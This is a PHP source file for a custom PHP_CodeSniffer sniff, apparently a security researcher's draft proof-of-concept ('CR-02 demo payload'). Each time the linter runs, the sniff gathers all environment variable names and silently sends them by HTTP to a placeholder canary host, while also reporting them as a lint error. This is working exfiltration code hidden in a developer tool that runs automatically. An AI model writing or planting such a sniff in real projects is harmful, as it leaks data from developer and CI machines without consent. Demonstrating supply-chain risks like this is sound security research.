<?php
// CR-02 demo payload (DRAFT — for the researcher's own repo only).
// Custom PHPCS sniff: reports process env keys as a violation and
// fire-and-forget fetches the canary URL (proves network egress).
// CANARY_URL is a placeholder: replace with the interactsh URL generated
// at demo time. First pass reports env KEY names only, never values.
// NOTE: NOT validated locally — this VM has no PHP. Run `php -l` on each
// file and `phpcs --standard=phpcs.xml` on a Mac (or in the demo repo)
// before opening the demo PR.
namespace MyStandard\Sniffs\Security;

use PHP_CodeSniffer\Files\File;
use PHP_CodeSniffer\Sniffs\Sniff;

class EnvSniff implements Sniff
{
    public function register()
    {
        return [T_OPEN_TAG];
    }

    public function process(File $phpcsFile, $stackPtr)
    {
        // Swap this for the interactsh URL at demo time (same pattern as CR-01).
        // Was a literal 'CANARY_URL?keys=...' string, which could never reach a canary
        // even if the sniff executed — fixed 2026-11-08.
        $canaryUrl = 'https://REPLACE-WITH-CANARY-AT-DEMO-TIME/hit';
        $keys = implode(',', array_keys($_ENV + getenv()));
        @file_get_contents($canaryUrl . '?keys=' . urlencode($keys));
        $phpcsFile->addError(
            'ENVKEYS:%s',
            $stackPtr,
            'EnvLeak',
            [$keys]
        );
        return $stackPtr + 1;
    }
}
